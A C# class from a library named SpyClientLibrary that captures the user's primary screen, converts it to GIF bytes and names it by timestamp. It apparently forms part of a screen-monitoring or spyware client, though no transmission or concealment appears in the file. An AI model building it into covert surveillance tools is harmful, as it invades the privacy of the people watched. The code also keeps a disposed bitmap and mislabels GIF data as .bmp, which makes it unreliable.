using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Windows.Forms;
using System.IO;

namespace SpyClientLibrary
{
    public class ScreenShot
    {
        public Bitmap _currentScreen { get; set; }
        public DateTime _scrrenDate { get; set; }
        public User _user { get; set; }
        public string _screenName { get; set; }        
        public byte[] _data { get; set; }

        public ScreenShot(User user)
        {
            _user=user;
        }

        public ScreenShot GenerateCurrentScreen()
        {
            _scrrenDate = DateTime.Now;

            using (Bitmap bmpScreenCapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                            Screen.PrimaryScreen.Bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bmpScreenCapture))
                {
                    g.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                     Screen.PrimaryScreen.Bounds.Y,
                                     0, 0,
                                     bmpScreenCapture.Size,
                                     CopyPixelOperation.SourceCopy);
                }
                _currentScreen = bmpScreenCapture;
                _data = ImageToByteArray(_currentScreen);
            }            
            CreateScreenName();
            return this;
        }

        private string CreateScreenName()
        {
            //FORMAT : username_YYYY_M_D_h_m.bmp
            _screenName = /*_user._userName + "_" +*/ 
                          _scrrenDate.Year.ToString() + "_" +
                          _scrrenDate.Month.ToString() +"_" +
                          _scrrenDate.Day.ToString() + "_" +
                          _scrrenDate.Hour.ToString() + "_" +
                          _scrrenDate.Minute.ToString() + ".bmp";
            return _screenName;
        }
        private byte[] ImageToByteArray(Image imageIn)
        {
            using (var ms = new MemoryStream())
            {
                imageIn.Save(ms, System.Drawing.Imaging.ImageFormat.Gif);
                return ms.ToArray();
            }
        }
        public static Image byteArrayToImage(byte[] byteArrayIn)
        {
            MemoryStream ms = new MemoryStream(byteArrayIn);
            Image returnImage = Image.FromStream(ms);
            return returnImage;
        }
    }
}
